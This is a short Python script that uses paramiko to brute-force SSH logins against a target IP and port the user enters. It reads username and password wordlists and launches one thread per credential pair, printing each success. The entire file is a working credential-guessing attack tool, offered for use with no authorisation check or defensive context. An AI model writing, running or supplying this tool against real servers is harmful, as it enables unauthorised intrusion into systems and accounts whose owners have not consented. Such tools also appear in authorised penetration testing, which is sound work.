import paramiko
import threading

def try_login(ip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port, username, password, timeout=3)
        print(f"Login successful with {username}:{password}")
    except paramiko.AuthenticationException:
        print(f"Login failed with {username}:{password}")
    except Exception as e:
        print(f"Error: {str(e)}")
    finally:
        ssh.close()

def main(ip, port, username_list, password_list):
    threads = []
    for username in username_list:
        for password in password_list:
            thread = threading.Thread(target=try_login, args=(ip, port, username, password))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    
    username_file = input("Enter path to username list: ")
    password_file = input("Enter path to password list: ")
    
    with open(username_file, 'r') as uf:
        username_list = uf.read().splitlines()
    
    with open(password_file, 'r') as pf:
        password_list = pf.read().splitlines()
    
    main(target_ip, target_port, username_list, password_list)
